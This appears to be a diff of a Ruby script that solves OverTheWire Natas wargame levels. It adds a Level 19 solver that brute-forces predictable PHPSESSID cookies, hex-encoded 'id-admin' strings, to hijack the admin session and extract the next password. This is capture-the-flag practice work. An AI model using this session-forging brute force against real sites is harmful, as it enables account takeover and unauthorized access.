@@ -571,15 +571,50 @@ class NatasLevel18 < NatasLevelBase
       ).body
       match = %r(Password: (\w{32})</pre>).match(data)
       next unless match
-      found(match[1])
-      break
+
+      log("Found session: #{id}")
+      return found(match[1])
     end
+
+    not_found
   end
 end
-
 
 ##
 # Level 19
 class NatasLevel19 < NatasLevelBase
   LEVEL = 19
+  PAGE = '/'
+  MAX_ID = 999
+  USERNAME = 'admin'
+
+  def exec
+    log('Bruteforcing PHPSESSID')
+    MAX_ID.times do |id|
+      session_id = "#{id}-#{USERNAME}".unpack1('H*')
+      data = post(
+        PAGE,
+        {
+          'Cookie' => "PHPSESSID=#{session_id}"
+        },
+        {
+          'username' => USERNAME,
+          'password' => ''
+        }
+      ).body
+      match = %r(Password: (\w{32})</pre>).match(data)
+      next unless match
+
+      log("Found session: #{session_id}")
+      return found(match[1])
+    end
+
+    not_found
+  end
+end
+
+##
+# Level 20
+class NatasLevel20 < NatasLevelBase
+  LEVEL = 20
 end
